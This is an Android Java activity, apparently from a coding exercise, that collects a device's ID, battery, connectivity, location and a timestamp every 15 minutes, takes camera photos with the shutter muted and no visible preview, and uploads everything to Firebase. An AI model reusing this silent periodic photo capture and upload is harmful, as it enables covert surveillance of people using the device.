package com.example.secquraiseproject;

import static java.lang.String.valueOf;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;


public class MainActivity extends AppCompatActivity {
    private FusedLocationProviderClient fusedLocationClient;
    private final static int REQUEST_CODE=100;
    TextView imei,ics,bcs,bc,loc,timestamp;
    private String TAG = MainActivity.class.getName();
    private ImageView iv_image;
    String db_imei, db_ics, db_bcs, db_bc, db_loc, db_timeStamp, db_img;
    private DatabaseReference root = FirebaseDatabase.getInstance().getReference("data");
    private StorageReference reference = FirebaseStorage.getInstance().getReference();
    private Uri imageUri;


    @SuppressLint({"MissingPermission", "MissingInflatedId"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        iv_image = findViewById(R.id.iv_image);
        Button im;
        imei=findViewById(R.id.txt_imei);
        ics=findViewById(R.id.txt_ics);
        bcs=findViewById(R.id.txt_bs);
        bc=findViewById(R.id.txt_bp);
        loc=findViewById(R.id.txt_loc);
        timestamp=findViewById(R.id.txt_timeStamp);
        im=findViewById(R.id.imei);



        im.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                AllFunctions();

            }
        });

        Thread t = new Thread() {
            @Override
            public void run() {
                while(true) {
                    try {
                        Thread.sleep(1000*60*15);
                        AllFunctions();
                    } catch (InterruptedException ie) {
                    }
                }
            }
        };
        t.start();



    }

//    All Functions
    private void AllFunctions(){

        db_imei=UniqueId();
        db_ics=InternetConnection();
        db_bcs=BatteryStatus();
        db_bc=BatteryChargin();
        db_timeStamp=TimeStamp();
        getLastLocation();
        requestAppPermission("0");
        //Toast.makeText(this, "abc" + db_loc, Toast.LENGTH_SHORT).show();


    }


//    Unique Id
    private String UniqueId(){

        String de = Settings.Secure.getString(getContentResolver(),Settings.Secure.ANDROID_ID);
        Log.d("TaskuniqueID", de);
        return de;
    }

//    Internet Connectivity Status
    private String InternetConnection(){

        ConnectivityManager cm = (ConnectivityManager)getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo nInfo = cm.getActiveNetworkInfo();
        boolean ins = nInfo != null && nInfo.isAvailable() && nInfo.isConnected();
        String a = valueOf(ins).toUpperCase(Locale.ROOT);
        Log.d("TaskInternet Connectivity", valueOf(ins));

        return a;
    }

//    Battery Details
    private String BatteryChargin(){

        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale;
        float p = batteryPct * 100;
        String bStatus = "null";

        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        if(status == BatteryManager.BATTERY_STATUS_CHARGING){
            bStatus="Charging";
        }
        else{
            bStatus = "Not Charging";
        }

        return String.valueOf(level);

    }

    private String BatteryStatus(){

        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale;
        float p = batteryPct * 100;
        String bStatus = "null";

        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        if(status == BatteryManager.BATTERY_STATUS_CHARGING){
            bStatus="Charging";
        }
        else{
            bStatus = "Not Charging";
        }


        return bStatus;

    }


//    Function to get Timestamp
    private String TimeStamp(){

        Long tsLong = System.currentTimeMillis()/1000;
        String ts = tsLong.toString();

        Log.d("TaskTimeStamp",ts);
        return ts;
    }


//    Function to get Location;
    private String getLastLocation(){
        final String[] loca = new String[1];
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(getApplicationContext());

        if(ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION)== PackageManager.PERMISSION_GRANTED){

            fusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
                @Override
                public void onSuccess(Location location) {
                    if(location!=null){
                        Geocoder geocoder = new Geocoder(MainActivity.this, Locale.getDefault());
                        List<Address> addresses = null;
                        try {
                            addresses = geocoder.getFromLocation(location.getLatitude(),location.getLongitude(),1);

                            loca[0] = addresses.get(0).getLocality()+", "+addresses.get(0).getCountryName();
                            db_loc = loca[0];
                        } catch (IOException e) {
                            e.printStackTrace();
                            Log.d("er","error");
                        }

                    }
                    else{
                        Log.d("abc","error");
                    }
                }
            });

        }
        else{
            askPermission();
        }

        return loca[0];
    }
//  Asking Permission for Location
    private void askPermission() {
        ActivityCompat.requestPermissions(MainActivity.this,new String[]
                {Manifest.permission.ACCESS_FINE_LOCATION},REQUEST_CODE);
    }
//Asking Permission for Location
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                getLastLocation();
            }
            else{
                Toast.makeText(this, "Required Permission", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void requestAppPermission(String type) {
        final String[] a = new String[1];
        Dexter.withActivity(MainActivity.this)
                .withPermissions(
                        Manifest.permission.CAMERA)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        if (report.areAllPermissionsGranted()) {
                            Log.d(TAG, "Preparing to take photo");
                            Camera camera = null;
                            try {
                                camera = Camera.open();
                                camera.enableShutterSound(false);
                            } catch (RuntimeException e) {
                                Log.d(TAG, "Camera not available: " + 1);
                                camera = null;
                                //e.printStackTrace();
                            }
                            try {
                                if (null == camera) {
                                    Log.d(TAG, "Could not get camera instance");
                                } else {
                                    Log.d(TAG, "Got the camera, creating the dummy surface texture");
                                    try {
                                        camera.setPreviewTexture(new SurfaceTexture(0));
                                        camera.startPreview();
                                    } catch (Exception e) {
                                        Log.d(TAG, "Could not set the surface preview texture");
                                        e.printStackTrace();
                                    }
                                    camera.takePicture(null, null, new Camera.PictureCallback() {
                                        @Override
                                        public void onPictureTaken(byte[] data, Camera camera) {

                                            String db = null;
                                            try {

                                                Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                                                iv_image.setImageBitmap(bmp);
                                                imageUri = Uri.parse(valueOf(bmp));

                                                ByteArrayOutputStream bytes = new ByteArrayOutputStream();

                                                byte bb[] = bytes.toByteArray();
                                                Uri filePath = getImageUri(getApplicationContext(),bmp);

                                                UploadImage(filePath);

                                            } catch (Exception e) {
                                                System.out.println(e.getMessage());
                                            }
                                            camera.release();
                                        }

                                    });
                                }

                            } catch (Exception e) {
                                camera.release();
                            }
                        }

                        // check for permanent denial of any permission
                        if (report.isAnyPermissionPermanentlyDenied()) {
                            // permission is denied permenantly, navigate user to app settings
                            showSettingsDialog();
                        }
                    }
                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                })
                .check();

    }
    private void showSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Need Permissions");
        builder.setMessage("This app needs permission to use this feature. You can grant them in app settings.");
        builder.setPositiveButton("GOTO SETTINGS", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
                openSettings();
            }
        });
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });
        builder.show();
    }
    private void openSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);

        startActivityForResult(intent, 101);
    }

    private void UploadImage(Uri ms){
        Log.d("abc", String.valueOf(ms));
        if(ms!=null){
            StorageReference ref = reference.child("images/").child(System.currentTimeMillis()+".jpg");
            Log.d("def", String.valueOf(ref));
            ref.putFile(ms).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    imei.setText(db_imei);
                    ics.setText(db_ics);
                    bc.setText(db_bc);
                    bcs.setText(db_bcs);
                    loc.setText(db_loc);
                    timestamp.setText(db_timeStamp);
                    ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                        @Override
                        public void onSuccess(Uri uri) {
                            db_img = uri.toString();
                            root.child(db_imei).child("IMEI").setValue(db_imei);
                            root.child(db_imei).child("Internet Connection Status").setValue(db_ics);
                            root.child(db_imei).child("Battery Charging Status").setValue(db_bcs);
                            root.child(db_imei).child("Battery Charging").setValue(db_bc);
                            root.child(db_imei).child("Timestamp").setValue(db_timeStamp);
                            root.child(db_imei).child("ImageUrl").setValue(db_img);
                            Toast.makeText(MainActivity.this, "Data uploaded", Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Toast.makeText(MainActivity.this, "Failed", Toast.LENGTH_SHORT).show();
                    Log.d("error", String.valueOf(e));
                }
            });
        }
        else{
            Toast.makeText(this, "Image Uri is null", Toast.LENGTH_SHORT).show();
        }
    }

    private Uri getImageUri(Context context, Bitmap bitmap){
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG,100,bytes);
//        String path = MediaStore.Images.Media.insertImage(getContentResolver(),bitmap,"title",null);
        String path = MediaStore.Images.Media.insertImage(getContentResolver(), bitmap,"IMG_"+Calendar.getInstance().getTime(),null);
         return Uri.parse(path);
    }

}